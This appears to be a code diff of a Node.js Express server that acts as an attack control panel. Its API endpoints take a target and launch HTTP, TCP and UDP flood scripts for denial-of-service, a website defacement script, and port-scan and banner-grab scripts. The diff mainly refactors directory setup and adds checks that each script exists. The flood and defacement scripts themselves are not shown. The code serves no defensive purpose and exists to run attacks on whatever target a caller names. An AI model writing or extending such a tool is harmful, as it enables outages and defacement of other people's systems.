@@ -33,6 +33,21 @@ function executeCommand(command, args) {
     });
 }
 
+const ddosDir = path.join(__dirname, 'ddos');
+if (!fs.existsSync(ddosDir)) {
+    fs.mkdirSync(ddosDir);
+}
+
+const defacementDir = path.join(__dirname, 'defacement');
+if (!fs.existsSync(defacementDir)) {
+    fs.mkdirSync(defacementDir);
+}
+
+const connectionDir = path.join(__dirname, 'connection');
+if (!fs.existsSync(connectionDir)) {
+    fs.mkdirSync(connectionDir);
+}
+
 app.post('/api/ddos', async (req, res) => {
     const target = req.body.target;
     const type = req.body.type;
@@ -45,30 +60,31 @@ app.post('/api/ddos', async (req, res) => {
     console.log(`DDoS attack requested: Target=${target}, Type=${type}, Duration=${duration}`);
 
     try {
-        const ddosDir = path.join(__dirname, 'ddos');
-        if (!fs.existsSync(ddosDir)) {
-            fs.mkdirSync(ddosDir);
-        }
-
         let scriptPath;
 
         switch (type) {
             case 'http':
                 scriptPath = path.join(ddosDir, 'http_flood.js');
+                if (!fs.existsSync(scriptPath)) {
+                    return res.status(500).send({ status: 'HTTP Flood script not found' });
+                }
                 break;
             case 'tcp':
                 scriptPath = path.join(ddosDir, 'tcp_flood.js');
+                if (!fs.existsSync(scriptPath)) {
+                    return res.status(500).send({ status: 'TCP Flood script not found' });
+                }
                 break;
             case 'udp':
                 scriptPath = path.join(ddosDir, 'udp_flood.js');
+                if (!fs.existsSync(scriptPath)) {
+                    return res.status(500).send({ status: 'UDP Flood script not found' });
+                }
                 break;
             default:
                 return res.status(400).send({ status: 'Invalid DDoS attack type' });
         }
 
-        if (!fs.existsSync(scriptPath)) {
-            return res.status(500).send({ status: `${type.toUpperCase()} Flood script not found` });
-        }
 
         const args = [target, duration];
         await executeCommand('node', [scriptPath, ...args]);
@@ -91,10 +107,6 @@ app.post('/api/defacement', async (req, res) => {
     console.log(`Defacement requested: Target=${target}, Action=${action}`);
 
     try {
-        const defacementDir = path.join(__dirname, 'defacement');
-        if (!fs.existsSync(defacementDir)) {
-            fs.mkdirSync(defacementDir);
-        }
         const scriptPath = path.join(defacementDir, 'deface.js');
 
         if (!fs.existsSync(scriptPath)) {
@@ -121,27 +133,25 @@ app.post('/api/connection', async (req, res) => {
     console.log(`Connection requested: Target=${target}, Type=${type}`);
 
     try {
-        const connectionDir = path.join(__dirname, 'connection');
-        if (!fs.existsSync(connectionDir)) {
-            fs.mkdirSync(connectionDir);
-        }
-
         let scriptPath;
 
         switch (type) {
             case 'portscan':
                 scriptPath = path.join(connectionDir, 'port_scan.js');
+                 if (!fs.existsSync(scriptPath)) {
+                    return res.status(500).send({ status: 'Port Scan script not found' });
+                }
                 break;
             case 'bannergrab':
                 scriptPath = path.join(connectionDir, 'banner_grab.js');
+                 if (!fs.existsSync(scriptPath)) {
+                    return res.status(500).send({ status: 'Banner Grab script not found' });
+                }
                 break;
             default:
                 return res.status(400).send({ status: 'Invalid connection type' });
         }
 
-        if (!fs.existsSync(scriptPath)) {
-            return res.status(500).send({ status: `${type.replace('scan', ' Scan').replace('grab', ' Grab')} script not found` });
-        }
 
         const args = [target];
         await executeCommand('node', [scriptPath, ...args]);
